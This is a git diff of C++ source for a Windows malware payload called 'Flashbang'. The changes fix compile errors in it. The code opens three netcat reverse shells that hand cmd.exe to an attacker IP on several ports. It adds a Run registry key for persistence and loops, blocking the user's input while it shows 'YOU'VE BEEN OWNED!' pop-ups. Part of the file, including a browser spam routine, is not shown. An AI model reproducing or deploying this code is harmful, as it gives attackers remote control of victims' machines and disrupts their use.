@@ -1,5 +1,3 @@
-//Flashbang Payload Source
-
 #include <iostream>
 using namespace std;
 #include <windows.h>
@@ -12,29 +10,29 @@ using namespace std;
 //to-do add a curler to download nc.exe to working directory
 
 //Punch holes out with reverse shells to attacker
-bool holepunch(){
+void holepunch(){
     //Reverse Shell Call #1 to attacker box over port 5555 
     string port1 = "nc.exe [ATTACKER IP] 5555 -e cmd.exe";
-    const char *command = port1.c_str(); 
-    system(command);
+    const char *command1 = port1.c_str(); 
     //Reverse Shell Call #1 to attacker box over port 5555 
     string port2 = "nc.exe [ATTACKER IP] 7777 -e cmd.exe";
-    const char *command = port2.c_str(); 
-    system(command);
+    const char *command2 = port2.c_str(); 
     //Reverse Shell Call #1 to attacker box over port 5555 
     string port3 = "nc.exe [ATTACKER IP] 9999 -e cmd.exe";
-    const char *command = port3.c_str(); 
-    system(command);
+    const char *command3 = port3.c_str(); 
+    system(command1);
+    system(command2);
+    system(command3);
 }
 
 //Establish persistent annoyance with an autoruns registry key
 void persistance(){
-    char buf[MAX_PATH]
-    GetModuleFileName(0, buf, MAX_PATH);
+    char buf[MAX_PATH];
+    GetModuleFileName(NULL, buf, MAX_PATH);
     HKEY persistKey;
     LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,KEY_WRITE, &persistKey);
     if( ERROR_SUCCESS == lnRes ){
-        lnRes = RegSetValueEx(persistKey, "Flashbang", 0, REG_SZ, exepath, strlen(exepath));
+        lnRes = RegSetValueEx(persistKey, "Flashbang", 0, REG_SZ, (BYTE*)buf, strlen(buf));
     }
 }
 
@@ -74,7 +72,6 @@ void browserTextSpam(){
     system(C);
     system(D);
     system(E);
-    }
 }
 
 int main(){
@@ -86,7 +83,7 @@ int main(){
     //Loop full of obstructions
     while(true){
         BlockUserInput();
-        MessageBoxA(NULL, "YOU'VE BEEN OWNED! Think Fast!", MB_ICONWARNING | MB_OK);
+        MessageBoxA(NULL, "YOU'VE BEEN OWNED!", "Think Fast!", MB_ICONWARNING | MB_OK);
         STARTUPINFOA si = {sizeof(STARTUPINFO)};
         PROCESS_INFORMATION pi;
         string sound = "PlaySound(TEXT(\"lul1.wav\"), NULL, SND_SYNC)";
